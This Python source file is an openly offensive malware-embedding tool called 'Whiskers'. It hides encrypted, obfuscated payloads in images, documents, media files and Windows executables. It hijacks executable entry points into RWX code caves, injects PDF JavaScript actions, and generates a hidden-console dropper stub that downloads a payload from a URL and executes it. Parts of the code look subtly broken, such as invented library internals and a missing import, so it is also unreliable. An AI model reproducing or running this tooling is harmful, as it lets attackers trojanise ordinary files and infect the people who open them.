#!/usr/bin/env python3
# Whiskers - Malware Embedding Tool
# Author: 0xSolitude
# Purpose: Embed malicious payloads into various file formats with stealth

import os
import sys
import struct
import random
import string
import argparse
import subprocess
import tempfile
import shutil
from pathlib import Path
import base64
import zlib
import hashlib
import time
import ctypes
import threading
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import pefile
import olefile
import zipfile
import io

class Whiskers:
    def __init__(self):
        self.version = "2.0"
        self.supported_formats = {
            'png': self._embed_png,
            'jpg': self._embed_jpg,
            'jpeg': self._embed_jpg,
            'sys': self._embed_pe,
            'dll': self._embed_pe,
            'exe': self._embed_pe,
            'doc': self._embed_doc,
            'docx': self._embed_docx,
            'pdf': self._embed_pdf,
            'mp3': self._embed_mp3,
            'mp4': self._embed_mp4,
            'avi': self._embed_avi,
            'gif': self._embed_gif
        }
        
    def _generate_key(self, password=None):
        """Generate encryption key from password or random"""
        if password:
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b'whiskers_salt',
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        else:
            key = Fernet.generate_key()
        return key
    
    def _encrypt_payload(self, payload, password=None):
        """Encrypt the payload with optional password"""
        key = self._generate_key(password)
        f = Fernet(key)
        encrypted_payload = f.encrypt(payload)
        return encrypted_payload, key
    
    def _decompress_payload(self, compressed_payload):
        """Decompress the payload"""
        return zlib.decompress(compressed_payload)
    
    def _compress_payload(self, payload):
        """Compress the payload"""
        return zlib.compress(payload)
    
    def _obfuscate_payload(self, payload):
        """Obfuscate the payload with simple XOR and base64"""
        # XOR with a random key
        xor_key = os.urandom(4)
        obfuscated = bytearray()
        for i, byte in enumerate(payload):
            obfuscated.append(byte ^ xor_key[i % len(xor_key)])
        
        # Base64 encode
        encoded = base64.b64encode(obfuscated + xor_key)
        return encoded
    
    def _deobfuscate_payload(self, obfuscated_payload):
        """Reverse the obfuscation process"""
        decoded = base64.b64decode(obfuscated_payload)
        payload = decoded[:-4]
        xor_key = decoded[-4:]
        
        deobfuscated = bytearray()
        for i, byte in enumerate(payload):
            deobfuscated.append(byte ^ xor_key[i % len(xor_key)])
        
        return bytes(deobfuscated)
    
    def _embed_png(self, carrier_file, payload, output_file):
        """Embed payload in PNG file using steganography"""
        with open(carrier_file, 'rb') as f:
            png_data = bytearray(f.read())
        
        # Find PNG chunks
        chunk_start = png_data.find(b'IHDR') - 4
        if chunk_start < 0:
            raise ValueError("Invalid PNG file")
        
        # Insert custom chunk before IDAT
        idat_pos = png_data.find(b'IDAT')
        if idat_pos < 0:
            raise ValueError("PNG file has no IDAT chunk")
        
        # Prepare payload chunk
        payload_length = len(payload)
        chunk_type = b'sEcR'  # Secret chunk
        chunk_crc = 0  # Will calculate
        
        # Calculate CRC
        crc_data = chunk_type + payload
        chunk_crc = zlib.crc32(crc_data) & 0xffffffff
        
        # Build chunk
        chunk_data = struct.pack('>I', payload_length) + chunk_type + payload + struct.pack('>I', chunk_crc)
        
        # Insert chunk
        new_png = png_data[:idat_pos] + chunk_data + png_data[idat_pos:]
        
        with open(output_file, 'wb') as f:
            f.write(new_png)
        
        return True
    
    def _embed_jpg(self, carrier_file, payload, output_file):
        """Embed payload in JPEG file using EXIF data"""
        with open(carrier_file, 'rb') as f:
            jpg_data = bytearray(f.read())
        
        # Find EXIF marker
        exif_pos = jpg_data.find(b'Exif')
        if exif_pos < 0:
            # Create EXIF section
            soi_pos = jpg_data.find(b'\xff\xd8')
            if soi_pos < 0:
                raise ValueError("Invalid JPEG file")
            
            # Insert EXIF marker with payload
            exif_marker = b'\xff\xe1' + struct.pack('>H', len(payload) + 8) + b'Exif\x00\x00' + payload
            new_jpg = jpg_data[:soi_pos+2] + exif_marker + jpg_data[soi_pos+2:]
        else:
            # Find end of EXIF section
            exif_start = exif_pos - 2
            exif_length = struct.unpack('>H', jpg_data[exif_start+2:exif_start+4])[0]
            exif_end = exif_start + 2 + exif_length
            
            # Replace EXIF data with our payload
            new_exif = b'\xff\xe1' + struct.pack('>H', len(payload) + 6) + b'Exif\x00\x00' + payload
            new_jpg = jpg_data[:exif_start] + new_exif + jpg_data[exif_end:]
        
        with open(output_file, 'wb') as f:
            f.write(new_jpg)
        
        return True
    
    def _embed_pe(self, carrier_file, payload, output_file):
        """Embed payload in PE files (exe, dll, sys) using code cave"""
        try:
            pe = pefile.PE(carrier_file)
            
            # Find a code cave (unused space between sections)
            code_cave = None
            for section in pe.sections:
                if section.SizeOfRawData - section.Misc_VirtualSize > len(payload) + 0x100:
                    code_cave = {
                        'section': section,
                        'offset': section.PointerToRawData + section.Misc_VirtualSize,
                        'size': section.SizeOfRawData - section.Misc_VirtualSize
                    }
                    break
            
            if not code_cave:
                # Add a new section
                new_section_name = b'.whisk\x00'
                new_section = pefile.SectionStructure()
                new_section.Name = new_section_name
                new_section.VirtualAddress = pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize
                new_section.Misc_VirtualSize = len(payload)
                new_section.SizeOfRawData = len(payload)
                new_section.PointerToRawData = pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData
                
                # Set section characteristics
                new_section.Characteristics = 0xE0000020  # RWX
                
                pe.sections.append(new_section)
                code_cave = {
                    'section': new_section,
                    'offset': new_section.PointerToRawData,
                    'size': new_section.SizeOfRawData
                }
            
            # Read the original file
            with open(carrier_file, 'rb') as f:
                pe_data = bytearray(f.read())
            
            # Embed payload at code cave
            for i, byte in enumerate(payload):
                pe_data[code_cave['offset'] + i] = byte
            
            # Modify entry point to jump to our payload
            if hasattr(pe, 'OPTIONAL_HEADER'):
                # Save original entry point
                original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                
                # Create a small stub to jump to our payload
                stub = b'\xE9'  # JMP rel32
                rel_offset = code_cave['section'].VirtualAddress - (pe.OPTIONAL_HEADER.AddressOfEntryPoint + 5)
                stub += struct.pack('<i', rel_offset)
                
                # Write stub at original entry point
                section_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                for section in pe.sections:
                    if section.VirtualAddress <= section_rva < section.VirtualAddress + section.Misc_VirtualSize:
                        offset = section.PointerToRawData + (section_rva - section.VirtualAddress)
                        for i, byte in enumerate(stub):
                            pe_data[offset + i] = byte
                        break
                
                # Add a jump back to original code at the end of payload
                return_stub = b'\xE9'  # JMP rel32
                return_offset = original_entry - (code_cave['section'].VirtualAddress + len(payload) + 5)
                return_stub += struct.pack('<i', return_offset)
                
                # Add return stub to payload
                payload_with_return = payload + return_stub
                
                # Update PE data with payload that includes return stub
                for i, byte in enumerate(payload_with_return):
                    pe_data[code_cave['offset'] + i] = byte
            
            # Write modified PE to output file
            with open(output_file, 'wb') as f:
                f.write(pe_data)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in PE file: {e}")
            return False
    
    def _embed_doc(self, carrier_file, payload, output_file):
        """Embed payload in DOC file using OLE structure"""
        try:
            # Create a temporary copy
            temp_doc = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(carrier_file, temp_doc.name)
            temp_doc.close()
            
            # Open the OLE file
            ole = olefile.OleFileIO(temp_doc.name)
            
            # Create a new stream for our payload
            ole_stream_name = '\x01Ole10Native'
            if ole.exists(ole_stream_name):
                # Stream already exists, modify it
                ole_data = ole.get_type(ole_stream_name)
                ole_data += payload
            else:
                # Create new stream
                ole._olestream._olefile[ole_stream_name] = payload
            
            # Save and close
            ole._olefile.save()
            ole.close()
            
            # Move to output file
            shutil.move(temp_doc.name, output_file)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in DOC file: {e}")
            return False
    
    def _embed_docx(self, carrier_file, payload, output_file):
        """Embed payload in DOCX file using ZIP structure"""
        try:
            # Open the DOCX as a ZIP file
            with zipfile.ZipFile(carrier_file, 'r') as zip_ref:
                # Create a new ZIP file with our payload
                with zipfile.ZipFile(output_file, 'w') as new_zip:
                    # Copy all existing files
                    for item in zip_ref.infolist():
                        data = zip_ref.read(item.filename)
                        new_zip.writestr(item, data)
                    
                    # Add our payload as a new file
                    new_zip.writestr('word/whiskers.xml', payload)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in DOCX file: {e}")
            return False
    
    def _embed_pdf(self, carrier_file, payload, output_file):
        """Embed payload in PDF file using JavaScript"""
        try:
            with open(carrier_file, 'rb') as f:
                pdf_data = bytearray(f.read())
            
            # Find end of PDF
            end_pdf = pdf_data.find(b'%%EOF')
            if end_pdf < 0:
                raise ValueError("Invalid PDF file")
            
            # Create a JavaScript object with our payload
            js_obj = b'<< /Type /Action /S /JavaScript /JS ('
            js_obj += payload
            js_obj += b') >>\n'
            
            # Insert before %%EOF
            new_pdf = pdf_data[:end_pdf] + js_obj + pdf_data[end_pdf:]
            
            with open(output_file, 'wb') as f:
                f.write(new_pdf)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in PDF file: {e}")
            return False
    
    def _embed_mp3(self, carrier_file, payload, output_file):
        """Embed payload in MP3 file using ID3 tags"""
        try:
            with open(carrier_file, 'rb') as f:
                mp3_data = bytearray(f.read())
            
            # Check if ID3v2 tag exists
            if mp3_data.startswith(b'ID3'):
                # Find end of ID3 tag
                tag_size = struct.unpack('>I', b'\x00' + mp3_data[6:9])[0] + 10
                tag_end = tag_size
                
                # Insert our custom tag
                custom_tag = b'WHSK'  # Whiskers tag
                custom_tag_size = struct.pack('>I', len(payload))
                new_tag = custom_tag + custom_tag_size + payload
                
                new_mp3 = mp3_data[:tag_end] + new_tag + mp3_data[tag_end:]
            else:
                # Add ID3v2 tag at beginning
                tag_size = len(payload) + 10
                header = b'ID3\x04\x00\x00'
                size_bytes = struct.pack('>I', tag_size)
                new_mp3 = header + size_bytes + payload + mp3_data
            
            with open(output_file, 'wb') as f:
                f.write(new_mp3)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in MP3 file: {e}")
            return False
    
    def _embed_mp4(self, carrier_file, payload, output_file):
        """Embed payload in MP4 file using moov atom"""
        try:
            with open(carrier_file, 'rb') as f:
                mp4_data = bytearray(f.read())
            
            # Find moov atom
            moov_pos = mp4_data.find(b'moov')
            if moov_pos < 0:
                raise ValueError("Invalid MP4 file: no moov atom found")
            
            # Get moov atom size
            moov_size = struct.unpack('>I', mp4_data[moov_pos-4:moov_pos])[0]
            
            # Create a new free atom for our payload
            free_atom = b'free'
            free_size = struct.pack('>I', len(payload) + 8)
            new_atom = free_size + free_atom + payload
            
            # Insert before moov atom
            new_mp4 = mp4_data[:moov_pos-4] + new_atom + mp4_data[moov_pos-4:]
            
            with open(output_file, 'wb') as f:
                f.write(new_mp4)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in MP4 file: {e}")
            return False
    
    def _embed_avi(self, carrier_file, payload, output_file):
        """Embed payload in AVI file using junk chunk"""
        try:
            with open(carrier_file, 'rb') as f:
                avi_data = bytearray(f.read())
            
            # Find RIFF header
            riff_pos = avi_data.find(b'RIFF')
            if riff_pos < 0:
                raise ValueError("Invalid AVI file: no RIFF header found")
            
            # Find movi list
            movi_pos = avi_data.find(b'movi')
            if movi_pos < 0:
                raise ValueError("Invalid AVI file: no movi list found")
            
            # Get movi list size
            movi_size = struct.unpack('<I', avi_data[movi_pos-4:movi_pos])[0]
            
            # Create a junk chunk with our payload
            junk_chunk = b'JUNK'
            chunk_size = struct.pack('<I', len(payload))
            new_chunk = chunk_size + junk_chunk + payload
            
            # Insert after movi list
            insert_pos = movi_pos + movi_size
            new_avi = avi_data[:insert_pos] + new_chunk + avi_data[insert_pos:]
            
            # Update RIFF size
            new_size = struct.pack('<I', len(new_avi) - 8)
            new_avi[riff_pos+4:riff_pos+8] = new_size
            
            with open(output_file, 'wb') as f:
                f.write(new_avi)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in AVI file: {e}")
            return False
    
    def _embed_gif(self, carrier_file, payload, output_file):
        """Embed payload in GIF file using application extension"""
        try:
            with open(carrier_file, 'rb') as f:
                gif_data = bytearray(f.read())
            
            # Find GIF header
            if not gif_data.startswith(b'GIF87a') and not gif_data.startswith(b'GIF89a'):
                raise ValueError("Invalid GIF file")
            
            # Find end of header
            header_end = 6
            
            # Create application extension with our payload
            app_ext = b'\x21\xFF\x0B'  # Extension introducer and size
            app_ext += b'NETSCAPE2.0'  # Application identifier
            app_ext += b'\x03\x01'  # Application data
            app_ext += struct.pack('<H', len(payload))  # Payload size
            app_ext += payload
            app_ext += b'\x00'  # Block terminator
            
            # Insert after header
            new_gif = gif_data[:header_end] + app_ext + gif_data[header_end:]
            
            with open(output_file, 'wb') as f:
                f.write(new_gif)
            
            return True
            
        except Exception as e:
            print(f"Error embedding in GIF file: {e}")
            return False
    
    def embed_payload(self, carrier_file, payload_file, output_file, file_format=None, 
                     password=None, encrypt=True, compress=True, obfuscate=True):
        """Main method to embed payload in carrier file"""
        # Determine file format if not specified
        if not file_format:
            file_format = Path(carrier_file).suffix.lower().lstrip('.')
        
        if file_format not in self.supported_formats:
            raise ValueError(f"Unsupported file format: {file_format}")
        
        # Read payload
        with open(payload_file, 'rb') as f:
            payload = f.read()
        
        # Process payload
        if compress:
            payload = self._compress_payload(payload)
        
        if encrypt:
            payload, key = self._encrypt_payload(payload, password)
            # Save key for extraction
            key_file = output_file + '.key'
            with open(key_file, 'wb') as f:
                f.write(key)
            print(f"Encryption key saved to: {key_file}")
        
        if obfuscate:
            payload = self._obfuscate_payload(payload)
        
        # Embed payload
        success = self.supported_formats[file_format](carrier_file, payload, output_file)
        
        if success:
            print(f"Successfully embedded payload in {output_file}")
            return True
        else:
            print(f"Failed to embed payload in {output_file}")
            return False
    
    def extract_payload(self, carrier_file, output_file, key_file=None, file_format=None):
        """Extract payload from carrier file"""
        # Determine file format if not specified
        if not file_format:
            file_format = Path(carrier_file).suffix.lower().lstrip('.')
        
        if file_format not in self.supported_formats:
            raise ValueError(f"Unsupported file format: {file_format}")
        
        # Read carrier file
        with open(carrier_file, 'rb') as f:
            carrier_data = f.read()
        
        # Extract payload based on file format
        if file_format == 'png':
            # Find our custom chunk
            chunk_start = carrier_data.find(b'sEcR')
            if chunk_start < 0:
                raise ValueError("No embedded payload found")
            
            chunk_start -= 4  # Include length field
            payload_length = struct.unpack('>I', carrier_data[chunk_start:chunk_start+4])[0]
            payload = carrier_data[chunk_start+8:chunk_start+8+payload_length]
        
        elif file_format in ['jpg', 'jpeg']:
            # Find EXIF marker
            exif_pos = carrier_data.find(b'Exif')
            if exif_pos < 0:
                raise ValueError("No embedded payload found")
            
            # Skip Exif identifier
            payload_start = exif_pos + 6
            payload = carrier_data[payload_start:]
        
        elif file_format in ['exe', 'dll', 'sys']:
            # Find our custom section
            pe = pefile.PE(carrier_file)
            section_found = False
            
            for section in pe.sections:
                if section.Name.decode('utf-8').strip('\x00') == '.whisk':
                    payload_start = section.PointerToRawData
                    payload_end = payload_start + section.SizeOfRawData
                    with open(carrier_file, 'rb') as f:
                        f.seek(payload_start)
                        payload = f.read(payload_end - payload_start)
                    section_found = True
                    break
            
            if not section_found:
                raise ValueError("No embedded payload found")
        
        elif file_format == 'doc':
            # Extract from OLE stream
            ole = olefile.OleFileIO(carrier_file)
            if ole.exists('\x01Ole10Native'):
                payload = ole.get_type('\x01Ole10Native')
            else:
                raise ValueError("No embedded payload found")
            ole.close()
        
        elif file_format == 'docx':
            # Extract from ZIP
            with zipfile.ZipFile(carrier_file, 'r') as zip_ref:
                if 'word/whiskers.xml' in zip_ref.namelist():
                    payload = zip_ref.read('word/whiskers.xml')
                else:
                    raise ValueError("No embedded payload found")
        
        elif file_format == 'pdf':
            # Find JavaScript object
            js_start = carrier_data.find(b'/Type /Action /S /JavaScript /JS (')
            if js_start < 0:
                raise ValueError("No embedded payload found")
            
            js_start += 40  # Skip the JS object start
            js_end = carrier_data.find(b')', js_start)
            payload = carrier_data[js_start:js_end]
        
        elif file_format == 'mp3':
            # Find our custom tag
            tag_pos = carrier_data.find(b'WHSK')
            if tag_pos < 0:
                raise ValueError("No embedded payload found")
            
            tag_size = struct.unpack('>I', carrier_data[tag_pos+4:tag_pos+8])[0]
            payload = carrier_data[tag_pos+8:tag_pos+8+tag_size]
        
        elif file_format == 'mp4':
            # Find our free atom
            free_pos = carrier_data.find(b'free')
            if free_pos < 0:
                raise ValueError("No embedded payload found")
            
            atom_size = struct.unpack('>I', carrier_data[free_pos-4:free_pos])[0]
            payload = carrier_data[free_pos+4:free_pos+4+atom_size-8]
        
        elif file_format == 'avi':
            # Find our junk chunk
            junk_pos = carrier_data.find(b'JUNK')
            if junk_pos < 0:
                raise ValueError("No embedded payload found")
            
            chunk_size = struct.unpack('<I', carrier_data[junk_pos-4:junk_pos])[0]
            payload = carrier_data[junk_pos+4:junk_pos+4+chunk_size]
        
        elif file_format == 'gif':
            # Find application extension
            app_ext_pos = carrier_data.find(b'NETSCAPE2.0')
            if app_ext_pos < 0:
                raise ValueError("No embedded payload found")
            
            # Skip to payload size
            payload_size_pos = app_ext_pos + 11
            payload_size = struct.unpack('<H', carrier_data[payload_size_pos:payload_size_pos+2])[0]
            payload = carrier_data[payload_size_pos+2:payload_size_pos+2+payload_size]
        
        # Deobfuscate payload
        try:
            payload = self._deobfuscate_payload(payload)
        except:
            pass  # Payload might not be obfuscated
        
        # Decrypt payload if key is provided
        if key_file and os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                key = f.read()
            
            try:
                f = Fernet(key)
                payload = f.decrypt(payload)
            except:
                print("Failed to decrypt payload with provided key")
        
        # Decompress payload
        try:
            payload = self._decompress_payload(payload)
        except:
            pass  # Payload might not be compressed
        
        # Write payload to output file
        with open(output_file, 'wb') as f:
            f.write(payload)
        
        print(f"Successfully extracted payload to {output_file}")
        return True
    
    def generate_stub(self, output_file, payload_url=None, key=None):
        """Generate a stub that can extract and execute the payload"""
        stub_code = f'''
import os
import sys
import urllib.request
import tempfile
import subprocess
import base64
import zlib
from cryptography.fernet import Fernet

def extract_and_run():
    # Download payload if URL is provided
    {"payload = urllib.request.urlopen('{payload_url}').read()" if payload_url else "payload = b''"}
    
    # Decrypt if key is provided
    {"key = b'{key}'" if key else "key = None"}
    if key:
        f = Fernet(key)
        payload = f.decrypt(payload)
    
    # Decompress
    try:
        payload = zlib.decompress(payload)
    except:
        pass
    
    # Write to temp file and execute
    temp_file = tempfile.mktemp(suffix='.exe')
    with open(temp_file, 'wb') as f:
        f.write(payload)
    
    # Execute
    subprocess.Popen(temp_file, shell=True)
    
    # Clean up after a delay
    threading.Timer(5.0, lambda: os.remove(temp_file)).start()

if __name__ == "__main__":
    extract_and_run()
'''
        
        with open(output_file, 'w') as f:
            f.write(stub_code)
        
        # Compile to executable if PyInstaller is available
        try:
            subprocess.run(['pyinstaller', '--onefile', '--noconsole', output_file], check=True)
            print(f"Stub compiled to executable: {output_file.replace('.py', '.exe')}")
        except:
            print(f"Stub saved as Python script: {output_file}")
        
        return True


def main():
    parser = argparse.ArgumentParser(description='Whiskers - Advanced Malware Embedding Tool')
    parser.add_argument('-v', '--version', action='version', version=f'Whiskers {Whiskers().version}')
    
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Embed command
    embed_parser = subparsers.add_parser('embed', help='Embed payload in carrier file')
    embed_parser.add_argument('carrier', help='Carrier file path')
    embed_parser.add_argument('payload', help='Payload file path')
    embed_parser.add_argument('output', help='Output file path')
    embed_parser.add_argument('-f', '--format', help='File format (if not detectable from extension)')
    embed_parser.add_argument('-p', '--password', help='Password for encryption')
    embed_parser.add_argument('--no-encrypt', action='store_true', help='Disable encryption')
    embed_parser.add_argument('--no-compress', action='store_true', help='Disable compression')
    embed_parser.add_argument('--no-obfuscate', action='store_true', help='Disable obfuscation')
    
    # Extract command
    extract_parser = subparsers.add_parser('extract', help='Extract payload from carrier file')
    extract_parser.add_argument('carrier', help='Carrier file path')
    extract_parser.add_argument('output', help='Output file path for extracted payload')
    extract_parser.add_argument('-f', '--format', help='File format (if not detectable from extension)')
    extract_parser.add_argument('-k', '--key', help='Key file for decryption')
    
    # Stub generation command
    stub_parser = subparsers.add_parser('stub', help='Generate extraction stub')
    stub_parser.add_argument('output', help='Output file path')
    stub_parser.add_argument('-u', '--url', help='URL to download payload from')
    stub_parser.add_argument('-k', '--key', help='Decryption key')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    whiskers = Whiskers()
    
    try:
        if args.command == 'embed':
            success = whiskers.embed_payload(
                carrier_file=args.carrier,
                payload_file=args.payload,
                output_file=args.output,
                file_format=args.format,
                password=args.password,
                encrypt=not args.no_encrypt,
                compress=not args.no_compress,
                obfuscate=not args.no_obfuscate
            )
            if success:
                print("Embedding completed successfully")
            else:
                print("Embedding failed")
                sys.exit(1)
        
        elif args.command == 'extract':
            success = whiskers.extract_payload(
                carrier_file=args.carrier,
                output_file=args.output,
                key_file=args.key,
                file_format=args.format
            )
            if success:
                print("Extraction completed successfully")
            else:
                print("Extraction failed")
                sys.exit(1)
        
        elif args.command == 'stub':
            success = whiskers.generate_stub(
                output_file=args.output,
                payload_url=args.url,
                key=args.key
            )
            if success:
                print("Stub generation completed successfully")
            else:
                print("Stub generation failed")
                sys.exit(1)
    
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
                
               
